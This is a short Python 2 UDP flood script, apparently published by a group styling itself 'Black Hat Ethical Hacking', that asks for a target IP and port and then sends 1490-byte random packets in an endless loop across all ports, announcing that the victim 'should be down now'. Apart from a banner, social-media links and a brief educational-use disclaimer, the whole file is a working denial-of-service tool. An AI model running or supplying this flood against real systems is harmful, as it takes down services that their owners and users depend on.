import sys
import os
import time
import socket
import random
#This is where the magic starts using the power of python
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############
#Install Figlet
os.system("clear")
os.system("apt-get install -y figlet")
os.system("figlet Black Hat Ethical Hacking")
print
print "Author   : SaintDruG"
print "Website : https://www.blackhatethicalhacking.com"
print "Github   : https://github.com/blackhatethicalhacking"
print "Facebook : https://www.facebook.com/secur1ty1samyth"
print "YouTube : https://www.youtube.com/channel/UCLfbThqyvG00lzOdMyB4GkQ"
print "Linkedin : https://www.linkedin.com/company/black-hat-ethical-hacking/"
print "Instagram : https://www.instagram.com/blackhatethicalhacking/"
print "Twitter : https://twitter.com/secur1ty1samyth"
print "Security is a myth..   : Follow us & Stay Tuned!"
print "This tool is written for educational purposes only - helping the defensive team look into how such attacks take place."
print "BHEH Is not responsivle for misusing it and must have an NDA signed to perform such attacks"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[                    ] 0% "
time.sleep(4.9)
print "[=====               ] 25%"
time.sleep(4.9)
print "[==========          ] 50%"
time.sleep(4.9)
print "[===============     ] 75%"
time.sleep(4.9)
print "[====================] 100%"
time.sleep(2.9)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s - The Victim should be down now..."%(sent,ip,port)
     if port == 65534:
       port = 1
